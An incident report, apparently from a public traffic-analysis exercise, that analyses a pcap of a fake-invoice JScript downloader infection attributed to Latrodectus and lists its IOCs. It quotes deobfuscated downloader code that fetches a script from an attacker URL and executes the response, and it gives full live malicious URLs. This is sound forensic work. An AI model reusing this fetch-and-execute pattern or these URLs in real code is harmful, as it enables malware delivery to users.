# Incident Report: Host DESKTOP-H8ALZBV — Fake-Invoice JS Downloader → C2 Beaconing

**Evidence reviewed:** `2024-08-15-traffic-analysis-exercise.pcap` (18,189 frames, ~1962s capture). No IDS/Suricata alert exports or other artifacts were present in the evidence directory — only the pcap. All findings below are derived directly from packet data and objects carved out of the capture.

## Victim host

| Field | Value |
|---|---|
| IPv4 | **10.8.15.133** |
| MAC address | **00:1c:bf:03:54:82** (confirmed via ARP and DHCP) |
| Windows hostname | **DESKTOP-H8ALZBV** (NBNS `<00>`/`<20>`, DHCP option 12, mDNS) |
| AD domain | `lafontainebleu.org`, domain controller `WIN-JEGJIX7Q9RS.lafontainebleu.org` at 10.8.15.4 |
| Logged-in user | **plucero** (Kerberos `CNameString`, seen in exchanges with both 10.8.15.133 and the DC 10.8.15.4) |

## Malware family

Attribution is **behavioral, not signature-confirmed** — no IDS/AV alert was provided with this evidence, so the name below is a judgment call based on observed TTPs, not a hash or rule match.

The infection chain matches the **Latrodectus** loader's known 2024 pattern: a fake-invoice phishing lure delivers a heavily junk-padded JScript downloader that calls back to attacker infrastructure for a second stage, then pulls a DLL payload over plain HTTP via BITS, followed by sustained HTTP C2 beaconing with a spoofed legacy Internet Explorer User-Agent. Specific evidence for each stage:

1. **t=74.7s** — GET to `quote.checkfedexexp.com` (FedEx-themed lure) returns a 2.7 MB `application/octet-stream` ZIP.
2. Inside the ZIP: **`Invoice-876597035-003-8331775-8334138.js`** — a ~6.99 MB JScript file, almost entirely padded with garbage text pulled from unrelated public documents (MPI standard docs, OECD/IPCC reports) to inflate its size and evade AV. Stripping the `/* ... */` comment padding reveals real executable statements interleaved throughout, including:
   - `WScript.Sleep(10000);`
   - Construction of an `ActiveXObject`-style request object via `new Function(...)`, then `.open('GE'+''+'T', "https://business.checkfedexexp.com/data-privacy?zj=...", ...)` and `.send()`
   - The response body is passed to `function(x){ (Function(x)())} ` — i.e. the returned text is dynamically compiled and executed (an `eval` equivalent).
3. **t=100.2s** — DNS query and TLS SNI for `business.checkfedexexp.com` confirms the JS actually fired this callback in the capture.
4. **t=135.9s** — `Microsoft BITS/7.8` HEAD then GET to bare IP `72.5.43.29` for `/data/0f60a3e7baecf2748b1c8183ed37d1e4`, returning a 159,232-byte **PE32+ DLL**, mislabeled with `Content-Type: text/html`. This is consistent with the second-stage script invoking `bitsadmin`/BITS to fetch the loader DLL.
5. **t=196.8s → 1962.0s** (end of capture) — 308 HTTP requests (304 GET / 3 POST / 1 HEAD) from 10.8.15.133 to `72.5.43.29:80`, all to `/`, using the spoofed User-Agent `Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705)` on a roughly 5–8 second interval — classic C2 check-in beaconing that continues uninterrupted through the end of the capture.

## Indicators of Compromise (all observed directly in this capture)

**C2 endpoint**
- `72.5.43.29:80` — plain HTTP, bare-IP GET/POST `/` beacon, spoofed UA `Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705)`, active 135.9s–1962.0s (308 requests)

**Malicious domains**
- `quote.checkfedexexp.com` — initial phishing/lure landing page
- `business.checkfedexexp.com` — second-stage callback issued by the malicious JS
- Both resolve to the same Cloudflare-fronted IPs: `104.21.55.70`, `172.67.170.159` (shared CDN edge — low-value as network blocklist entries on their own; the domains are the real indicator)

**Malicious URLs**
- `http://quote.checkfedexexp.com/managements?16553a25e45250a41fd5&endeds=MIGpq&JStx=59bf050d37df88a9-ade43358-eaa1220b-0571422b-0f33e6aa150e86bafd0ed4&Ld=9d7502d88d752a27b1d00587309184b5a215` — served the malicious ZIP
- `https://business.checkfedexexp.com/data-privacy?zj=ZzqRKxVRQ&pOd=GEokiOXFwH&sourcedp=tQMQJlIo&Tfocontent=IxGTZjXqxJ&Jr_cid=9464552&L=81743888` — second-stage fetch, reconstructed from the deobfuscated JS and confirmed by DNS/TLS SNI in the capture
- `http://72.5.43.29/data/0f60a3e7baecf2748b1c8183ed37d1e4` — DLL payload delivery via BITS

**Transferred files and hashes** (extracted and hashed directly from the pcap)

| File | SHA256 | Notes |
|---|---|---|
| ZIP archive (`managements?...`) | `798563fcf7600f7ef1a35996291a9dfb5f9902733404dd499e2e736ea1dc6fc5` | Delivered by the FedEx lure page |
| `Invoice-876597035-003-8331775-8334138.js` | `dab98819d1d7677a60f5d06be210d45b74ae5fd8cf0c24ec1b3766e25ce6dc2c` | Junk-padded JScript downloader inside the ZIP |
| `0f60a3e7baecf2748b1c8183ed37d1e4` | `b7aec5f73d2a6bbd8cd920edb4760e2edadc98c3a45bf4fa994d47ca9cbd02f6` | PE32+ x64 DLL, fetched via BITS from 72.5.43.29, performs the ongoing C2 beaconing |

## Benign context (ruled out, not indicators)
- Traffic to `msftconnecttest.com`, `msedge.b.tlu.dl.delivery.mp.microsoft.com` (Windows Update Delivery Optimization/BITS), `bing.com`, `msn.com`, Office/Microsoft 365 domains, and standard SSDP/mDNS/LLMNR/Kerberos/LDAP chatter to the DC — all normal enterprise workstation background noise, not related to the intrusion.

## Gap noted
The pcap does not capture how the user reached `quote.checkfedexexp.com` (no referer, no preceding search/redirect, no SMTP) — the capture appears to start at or just before the user's click on the lure. The initial delivery vector (email vs. malvertising/search) cannot be confirmed from this evidence alone.
